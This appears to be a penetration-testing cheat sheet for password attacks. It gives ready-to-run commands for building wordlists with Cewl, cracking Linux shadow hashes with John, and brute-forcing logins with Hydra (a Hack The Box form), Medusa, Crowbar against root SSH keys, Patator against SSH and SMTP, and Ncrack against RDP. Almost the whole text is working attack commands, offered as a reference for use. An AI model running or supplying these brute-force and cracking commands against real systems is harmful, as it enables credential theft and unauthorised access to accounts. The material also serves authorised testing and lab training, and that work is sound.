### Custom Wordlists
Html2dic can sometimes work better and faster than Cewl.
```
curl http://example.com > example.txt
```
then run

```
html2dic example.txt
```
Or you can use Cewl with a minimum word length of 4 here and mangle it with John.
```
cewl -m 4 -w dict.txt http://site.url
john --wordlist=dict.txt --rules --stdout
```

### John

So to crack passwords normally with john
```
john --wordlist=wordlist.txt dump.txt
```
Adds the default john rules
```
john --rules --wordlist=wordlist.txt dump.txt
```

When you have Linux passwd and a shadow file to crack, run this

```
unshadow passwd-file.txt shadow-file.txt > unshadowed.txt
john --rules --wordlist=wordlist.txt unshadowed.txt
```

### Hydra, Patator, Medusa, Crowbar 

Hydra post form example from Nineveh on Hackthebox.
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt nineveh.htb http-post-form "/department/login.php:username=^USER^&password=^PASS^&Login=Login:Invalid Password" -V -I
```
Medusa http authentication example
```
medusa -h $TARGET -u admin -P passwords.txt -M http -m DIR:/admin -T 10
```
Crowbar brute root user with all SSH keys in a folder
```
crowbar.py -b sshkey -s 192.168.2.105/32 -u root -k /root/.ssh/
```

SSH password brute Patator syntax
```
patator ssh_login host=10.10.10.10 user=FILE0 password=FILE1 0=user.txt 1=wordlist.txt -x ignore:mesg='Authentication failed.'
```
SMTP Patator syntax
```
patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst
patator smtp_login host=192.168.17.129 user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst
patator smtp_login host=192.168.17.129 helo='ehlo 192.168.17.128' user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst
patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst -x ignore:fgrep='incorrect password or account name'
```

Ncrack RDP
```
ncrack -vv --user admin -P password-file.txt rdp://192.168.0.101
```



